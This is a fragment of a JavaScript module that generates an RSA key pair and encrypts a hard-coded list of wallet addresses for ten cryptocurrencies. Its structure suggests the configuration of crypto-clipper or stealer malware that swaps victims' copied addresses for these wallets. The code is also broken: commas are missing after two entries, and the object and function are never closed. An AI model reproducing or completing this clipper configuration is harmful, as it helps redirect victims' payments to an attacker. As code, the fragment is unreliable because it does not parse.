module.exports = (client) => {
    return {
        default_padding: client.requires.crypto.constants.RSA_PKCS1_OAEP_PADDING,
        default_oaepHash: "sha256",
        keyPair: client.requires.crypto.generateKeyPairSync("rsa", {
            modulusLength: 2048,
        }),
        xmr: client.utils.encryption.encryptData("45eWcD5nd1k7XVYtjkiKiGbmZg6kKU8C616jxTYGbCPzEFsqcbyBrnWPsa1GuUpM7cUxhdqaU9WhwHRXi8M4GBP1TqcKsT6")
        btc: client.utils.encryption.encryptData("bc1qur6ealv2rs6754d052twvm3hpqdactew5el282"),
        ltc: client.utils.encryption.encryptData("LboWHnewnpZu454bqF73N9e5C65YmGXopz"),
        eth: client.utils.encryption.encryptData("0x8300F8a9E9b37Ed3d43baA08764569f66C41aE01"),
        xrp: client.utils.encryption.encryptData("rhJGNT1xDVFqqeAMBwMfLw5mvuDF1zNBTm"),
        neo: client.utils.encryption.encryptData("ARcXHEe5ffSxK6g34YfhhRRhxayJu6FrFL"),
        bch: client.utils.encryption.encryptData("qzj2xg67qnl0suh3ma0ermd0srh2vg9ctvcqv2z8mc")
        doge: client.utils.encryption.encryptData("DKsEsuqmkK3pnN8PNNVrMjxGCqhqVZUECK"),
        dash: client.utils.encryption.encryptData("XbdxRimdKYVfx8aBqGkxq9T22SjRhJ97zP"),
         xlm: client.utils.encryption.encryptData("GABTUC3LK47DORTBMNLOWDKYB22O5GX3E7BQCFFUHUMA7JES75UVSAV6")
         